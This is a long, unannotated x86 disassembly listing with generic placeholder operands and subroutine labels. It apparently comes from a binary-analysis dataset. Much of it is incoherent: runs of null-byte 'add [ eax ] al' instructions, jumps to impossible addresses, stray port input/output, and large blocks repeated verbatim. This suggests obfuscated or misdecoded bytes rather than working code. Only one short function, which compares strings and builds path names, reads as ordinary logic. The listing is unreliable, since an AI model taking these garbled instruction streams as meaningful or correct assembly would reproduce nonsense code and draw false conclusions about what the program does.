add esp 0x4
ja r-xdata
jge 0x100a5ca
pop eax
jg r-xdata
jne 0xffffffffe7c21014
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_4024e5
pop edx
jns r-xdata
jne r-xdata
add ecx 0x54bf0a75
jne r-xdata
push ecx
call sub_4024e5
jmp [ 0x70246c83 ]
sub ebx 0x81f9795a
shl [ ebp + 0xa ] 0xbf
push esp
sub [ esp + 0x70 ] 0x2
sub esp 0x8
jge r-xdata
mov edi 0xf1e85154
jno r-xdata
add eax 0xe89c5656
add eax 0xb9000000
jae r-xdata
add ecx 0x53575255
call sub_40251d
jne 0xffffffffa3a50b90
push esi
push esi
pushfd
call sub_40250e
mov ecx 0xc1810d71
push ebp
push edx
push edi
push ebx
mov [ fs : 0xffffffff9c248481 ] eax
add [ eax ] al
add [ ebx - 0x7cffbfdb ] ch
in al dx
add al 0x77
add eax 0xf0673e9
mov [ ebp + 0x9 ] esi
add edx 0x5e855
add [ eax ] al
mov ecx 0x850fef7f
jmp [ esp + 0xa8 ]
sub_40251d
add [ esp + 0x9c ] r-xdata
sub esp 0x4
ja r-xdata
jne r-xdata
jmp 0xffffffff894f2ba5
jg r-xdata
add edx 0x5e855
add [ eax ] al
jae r-xdata
jne 0xffffffffa864ca44
mov ecx 0x850fef7f
push ebp
call sub_402541
jns 0xffffffffc2c12eab
add [ eax ] al
add al ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7508ec83 ] bh
adc al 0x81
out 0x53 eax
push eax
call sub_402564
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_40255c
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104ea30
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_402595
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
cmp [ ebp - 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x57 ] eax
mov [ ebp - 0x53 ] ecx
mov [ ebp - 0x4f ] edx
push esi
push ebp
push esi
call sub_40275e
retn 0x10
mov edx [ ebp - 0x3c ]
cmp edx [ ebp - 0x44 ]
jbe r-xdata
mov [ ebp - 0x30 ] 0x5245
mov eax [ ebp + 0x7c ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x84 ] edx
lea eax [ ebp - 0x58 ]
add eax 0xffffed1b
mov [ ebp - 0x84 ] eax
jmp r-xdata
lea edx [ ebp + 0x28 ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x88 ] eax
lea edx [ ebp + 0x88 ]
lea eax [ ebp + 0x28 ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x88 ] edx
jmp r-xdata
cmp [ ebp - 0x84 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x54 ]
xor eax eax
sub eax edx
mov [ ebp - 0x8c ] eax
mov eax [ ebp + 0xc4 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x8c ] edx
jmp r-xdata
movzx ecx [ ebp + 0x8 ]
cmp [ ebp - 0x88 ] ecx
ja r-xdata
mov [ ebp - 0x70 ] 0x400
mov ecx [ ebp - 0x60 ]
call sub_401630
xor ecx ecx
sub ecx [ ebp - 0x48 ]
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x70 ] 0x400
mov ecx [ ebp - 0x60 ]
call sub_401630
lea eax [ ebp + 0x88 ]
shr eax 0x4
mov [ ebp - 0x90 ] eax
jmp r-xdata
lea ecx [ ebp - 0x48 ]
movzx edx cl
cmp [ ebp - 0x8c ] edx
jbe r-xdata
mov edx [ ebp - 0x90 ]
mov [ ebp - 0x30 ] edx
sub_40255c
push ebx
push eax
call sub_402564
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_40255c
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104ea30
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_402595
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
cmp [ ebp - 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x57 ] eax
mov [ ebp - 0x53 ] ecx
mov [ ebp - 0x4f ] edx
push esi
push ebp
push esi
call sub_40275e
retn 0x10
mov edx [ ebp - 0x3c ]
cmp edx [ ebp - 0x44 ]
jbe r-xdata
mov [ ebp - 0x30 ] 0x5245
mov eax [ ebp + 0x7c ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x84 ] edx
lea eax [ ebp - 0x58 ]
add eax 0xffffed1b
mov [ ebp - 0x84 ] eax
jmp r-xdata
lea edx [ ebp + 0x28 ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x88 ] eax
lea edx [ ebp + 0x88 ]
lea eax [ ebp + 0x28 ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x88 ] edx
jmp r-xdata
cmp [ ebp - 0x84 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x54 ]
xor eax eax
sub eax edx
mov [ ebp - 0x8c ] eax
mov eax [ ebp + 0xc4 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x8c ] edx
jmp r-xdata
movzx ecx [ ebp + 0x8 ]
cmp [ ebp - 0x88 ] ecx
ja r-xdata
mov [ ebp - 0x70 ] 0x400
mov ecx [ ebp - 0x60 ]
call sub_401630
xor ecx ecx
sub ecx [ ebp - 0x48 ]
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x70 ] 0x400
mov ecx [ ebp - 0x60 ]
call sub_401630
lea eax [ ebp + 0x88 ]
shr eax 0x4
mov [ ebp - 0x90 ] eax
jmp r-xdata
lea ecx [ ebp - 0x48 ]
movzx edx cl
cmp [ ebp - 0x8c ] edx
jbe r-xdata
mov edx [ ebp - 0x90 ]
mov [ ebp - 0x30 ] edx
sub_402564
pop ecx
pop ecx
jge r-xdata
ja r-xdata
xor edx 0x830f0a77
push ecx
push ebx
call sub_40255c
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
add [ esp + 0x18 ] 0x6
jae 0xffffffffe82878c3
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104ea30
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_402595
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
cmp [ ebp - 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x57 ] eax
mov [ ebp - 0x53 ] ecx
mov [ ebp - 0x4f ] edx
push esi
push ebp
push esi
call sub_40275e
retn 0x10
mov edx [ ebp - 0x3c ]
cmp edx [ ebp - 0x44 ]
jbe r-xdata
mov [ ebp - 0x30 ] 0x5245
mov eax [ ebp + 0x7c ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x84 ] edx
lea eax [ ebp - 0x58 ]
add eax 0xffffed1b
mov [ ebp - 0x84 ] eax
jmp r-xdata
lea edx [ ebp + 0x28 ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x88 ] eax
lea edx [ ebp + 0x88 ]
lea eax [ ebp + 0x28 ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x88 ] edx
jmp r-xdata
cmp [ ebp - 0x84 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x54 ]
xor eax eax
sub eax edx
mov [ ebp - 0x8c ] eax
mov eax [ ebp + 0xc4 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x8c ] edx
jmp r-xdata
movzx ecx [ ebp + 0x8 ]
cmp [ ebp - 0x88 ] ecx
ja r-xdata
mov [ ebp - 0x70 ] 0x400
mov ecx [ ebp - 0x60 ]
call sub_401630
xor ecx ecx
sub ecx [ ebp - 0x48 ]
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x70 ] 0x400
mov ecx [ ebp - 0x60 ]
call sub_401630
lea eax [ ebp + 0x88 ]
shr eax 0x4
mov [ ebp - 0x90 ] eax
jmp r-xdata
lea ecx [ ebp - 0x48 ]
movzx edx cl
cmp [ ebp - 0x8c ] edx
jbe r-xdata
mov edx [ ebp - 0x90 ]
mov [ ebp - 0x30 ] edx
sub_4026d3
pop eax
ja r-xdata
jne r-xdata
call [ 0xffffffff81027959 ]
pop eax
jno r-xdata
jo 0xffffffffe846982b
jns r-xdata
xor ebx 0x53e90173
pop ecx
jns r-xdata
leave
call 0x359e2f
adc eax 0x81027959
jae r-xdata
xor eax 0xf02795a
mov [ ebx + 0x248246c ] es
jns r-xdata
sub [ esp + 0x30 ] r-xdata
sub esp 0x4
jae r-xdata
push ebp
push esp
sub esp 0x8
call sub_4026ff
jae 0x5a761579
or ecx 0x30246c81
mov ebx 0x83004026
in al dx
add al 0x73
adc al [ ecx - 0x16fe8c0d ]
push ebx
jmp 0xffffffff83947c46
push edx
push ebp
sub esp 0xc
call sub_402724
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
mov bl 0x27
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f2dae
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub esp 0x4
jge r-xdata
sub [ esp + 0x48 ] 0x2
jl 0x4864938b
add al [ ebx + 0x77d04ec ]
sub_4026ff
pop edx
jns r-xdata
sub [ esp + 0x48 ] 0x2
sub esp 0x4
jge r-xdata
jl 0x4864938b
push edx
push ebp
sub esp 0xc
call sub_402724
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
mov bl 0x27
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f2dae
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
add al [ ebx + 0x77d04ec ]
sub_402724
add esp 0x4
jae r-xdata
pop ecx
jno r-xdata
jmp [ 0x5c244481 ]
jae r-xdata
ja 0xffffffffecc37c6b
add [ esp + 0x5c ] r-xdata
sub esp 0x4
jne r-xdata
mov esp 0x7304c483
or al 0xe8
add eax 0x81000000
ja r-xdata
jmp 0xffffffff8d4f2dae
jg r-xdata
je 0x460f98
jno r-xdata
mov edi 0xc368c483
add [ eax ] al
je 0xffffffff840015cc
push ebx
call sub_40274c
jge 0xffffffff844f31b8
jne r-xdata
push 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
add [ ebx + 0x545604ec ] 0x56
push eax
push ecx
call sub_402778
jpo 0x59282cee
les ebp [ eax - 0x3d ]
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3a9ccc
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53917bdd
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
test eax 0x8bad4d8b
push ebp
mov cl 0x8b
inc ebp
xchg esp eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
call sub_402793
mov esp 0x890f0573
out 0xff eax
and eax 0x5c244481
mov bl 0x27
inc eax
add [ ebx + 0x57504ec ] al
push edx
push ebp
sub esp 0xc
call sub_402724
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_40275e
sub esp 0x4
push esi
push esp
push esi
push eax
push ecx
call sub_402778
jpo 0x59282cee
jne r-xdata
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3a9ccc
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53917bdd
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
test eax 0x8bad4d8b
push ebp
mov cl 0x8b
inc ebp
xchg esp eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
call sub_402793
mov esp 0x890f0573
push edx
push ebp
sub esp 0xc
call sub_402724
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
mov bl 0x27
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f2dae
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_402778
pop edx
jae r-xdata
pop eax
jne r-xdata
sub ebx 0x10244483
push es
jge r-xdata
or eax 0xbb067358
ja r-xdata
jae 0x53917bdd
pop eax
jae r-xdata
call 0xe3a9ccc
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
test eax 0x8bad4d8b
push ebp
mov cl 0x8b
inc ebp
xchg esp eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
call sub_402793
mov esp 0x890f0573
sub esp 0x4
ja r-xdata
add [ esp + 0x10 ] 0x6
mov ebx 0x81f5735a
jmp r-xdata
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push edx
push ebp
sub esp 0xc
call sub_402724
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
mov bl 0x27
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f2dae
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_402793
jae r-xdata
pop edx
jns 0x5b001812
jmp [ esp + 0x24 ]
xor esi 0x242464ff
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
test eax 0x8bad4d8b
push ebp
mov cl 0x8b
inc ebp
xchg esp eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
jns r-xdata
sub_4027d0
push ebp
mov ebp esp
sub esp 0xa8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x58 ] ecx
mov eax [ ebp - 0x58 ]
add eax 0x21c
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x64 ] 0x0
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
mov edx [ ebp - 0x58 ]
add edx 0x21c
push edx
call [ lstrcmpiW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ eax ]
mov [ ebp - 0x90 ] ecx
mov edx [ ebp - 0x58 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x94 ] eax
push r--data
mov ecx [ ebp - 0x90 ]
push ecx
call [ ebp - 0x94 ]
mov [ ebp - 0x98 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x78 ] 0x0
push r--data
mov eax [ ebp - 0x5c ]
push eax
call sub_4036a0
add esp 0x8
sub eax [ ebp - 0x5c ]
sar eax 0x1
mov [ ebp - 0x78 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x4
call sub_40e50f
cdq
mov ecx 0x7fff
idiv ecx
imul edx eax 0xfffff83a
add edx 0xa
mov [ ebp - 0x60 ] edx
xor edx edx
mov eax [ ebp - 0x64 ]
mov ecx [ ebp - 0x5c ]
mov [ ecx + eax * 2 ] dx
push 0x0
mov edx [ ebp - 0x58 ]
add edx 0x21c
push edx
call [ ebp - 0x98 ]
mov eax 0x5c
mov ecx [ ebp - 0x64 ]
mov edx [ ebp - 0x5c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x64 ]
mov ecx [ ebp - 0x5c ]
lea edx [ ecx + eax * 2 + 0x2 ]
mov [ ebp - 0x5c ] edx
jmp r-xdata
mov ecx [ ebp - 0x78 ]
mov [ ebp - 0x64 ] ecx
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov [ ebp - 0x68 ] 0x0
cmp [ ebp - 0x60 ] 0x0
je r-xdata
mov eax [ ebp - 0x60 ]
add eax 0x1
mov [ ebp - 0x60 ] eax
cmp [ ebp - 0x60 ] 0x3e8
je r-xdata
push r--data
mov edx [ ebp - 0x5c ]
push edx
call sub_4036a0
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x6c ] 0x0
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x6c ]
cmp edx [ ebp - 0x60 ]
jae r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
mov ecx [ ebp - 0x68 ]
cmp ecx [ ebp - 0x60 ]
je r-xdata
mov eax [ ebp - 0x68 ]
add eax [ ebp - 0x6c ]
mov [ ebp - 0x68 ] eax
jmp r-xdata
cmp [ ebp - 0x68 ] 0x1
je r-xdata
call sub_40e50f
cdq
mov ecx 0x7fff
idiv ecx
imul edx eax 0xfffff83a
add edx 0xa
mov [ ebp - 0x68 ] edx
mov ecx [ ebp - 0x6c ]
add ecx 0x1
mov [ ebp - 0x6c ] ecx
mov eax [ ebp - 0x58 ]
mov ecx [ eax ]
mov [ ebp - 0x9c ] ecx
mov edx [ ebp - 0x58 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0xa0 ] eax
push r--data
mov ecx [ ebp - 0x9c ]
push ecx
call [ ebp - 0xa0 ]
mov [ ebp - 0x88 ] eax
mov [ ebp - 0xa4 ] eax
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x70 ] edx
push esi
push ebx
sub esp 0x10
call sub_403048
retn 0x50
sub_4029d0
jne r-xdata
jno r-xdata
or edi 0x9a890f
add [ eax ] al
add esp 0x8
jno r-xdata
sub edx 0x11e890f
add [ eax ] al
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44ee72
pop edx
jno r-xdata
mov ecx 0xe981637f
jae r-xdata
sub ecx 0xe1813e75
add [ eax + eax - 0x7af10000 ] 0xea810971
jns r-xdata
call [ 0x40246c81 ]
stosb [ edi ]
sub [ eax ] eax
sub esp 0x10
pop edx
ja r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
jns r-xdata
jge 0xffffffffb8afa9d2
pushfd
call sub_4029bb
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
push ebp
call sub_4029d0
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
or edi 0x8d0f2c73
jg r-xdata
jmp [ 0xce8d0f ]
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
jg r-xdata
jne 0x24c13a9b
jne r-xdata
call sub_402a5b
ja 0x504ae62
call 0x5290829b
add esp 0x4
jns r-xdata
mov eax 0xc7819173
jge r-xdata
jmp 0xffffffff844f5cfc
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcab37b
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
add esp 0x4
jne r-xdata
jg 0xffffffffff96add2
pop eax
jns r-xdata
sub eax 0xfec5e89c
jno r-xdata
sub esi 0x73bd047f
push ebp
jns r-xdata
xor edx 0x81257159
r-xdata
jno 0x16401815
pop edx
jg r-xdata
jpo 0xf70a338
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
ja r-xdata
and ecx 0xf681ad79
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
add esp 0x4
jno r-xdata
je 0xfffffffffed0ae44
jne r-xdata
jno 0xffffffff834f823f
ja r-xdata
jmp [ 0xfffffffff381df77 ]
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1ea2b
jae r-xdata
je 0xffffffff814fcc11
jne 0xffffffffeac1336b
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
ja r-xdata
call 0xffca53a
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
jg 0xffffffff9c947e46
ja r-xdata
jns r-xdata
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1ab65
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
push esi
push esi
call sub_402b46
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd843d
push edx
call sub_402a7c
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a46901
jae r-xdata
je 0xffffffffa3a4d011
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
call sub_402afb
xor edi 0x517f5859
jno 0xfffffffff2c185b8
push ecx
push ebx
call sub_402a4b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b39c
ja r-xdata
jge 0x71fc6ba3
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
push ebp
pushfd
call sub_402ca4
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jno r-xdata
mov ebx 0xf04c483
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jne r-xdata
or edx 0xf3812e79
pushfd
push esi
call sub_402c9b
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402db5
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa2af50
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jno r-xdata
sub esi 0x89641f79
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16a8a
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f6203
jne r-xdata
sub edi 0x64244481
inc ecx
xor eax [ eax ]
add esp 0x4
ja r-xdata
jl 0xffffffffffacbcc8
jae r-xdata
ja 0xffffffffa3c33c60
push ecx
push edx
push ebp
sub esp 0x4
call sub_402c67
xor ebx 0x15ff4e7f
mov edx 0xff47830f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
ja r-xdata
pop edx
mov eax 0xff55870f
jg r-xdata
jpo 0xdeb246
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
ja r-xdata
xor ebx 0xff3d870f
call sub_402c17
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403035
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
jmp 0xffffffffff79ad5e
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff936be
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_402cc7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
add eax 0x5abb2979
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f27a
jg r-xdata
ja 0xcab076
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44f4a9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f180
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9baf1d
pop edx
jge r-xdata
jo 0xffffffff854f876f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f235
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcff74
jae r-xdata
call sub_402e2c
jb 0xffffffff81b2aae2
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa290
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0b2b3
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd3eb7
add esp 0x4
jae r-xdata
jl 0xf3aff8
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
